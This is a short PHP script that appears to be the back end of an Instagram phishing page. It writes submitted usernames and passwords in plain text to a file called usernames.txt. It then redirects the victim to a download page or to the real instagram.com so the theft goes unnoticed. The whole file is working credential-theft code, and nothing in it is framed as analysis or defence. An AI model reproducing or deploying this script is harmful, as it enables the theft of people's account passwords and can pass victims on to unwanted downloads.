<?php
include 'download_config.php';
file_put_contents("usernames.txt", "Instagram Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);

if (!empty($download_url)) {
    header('Location: download.php');
} else {
    header('Location: https://instagram.com');
}
exit();
?>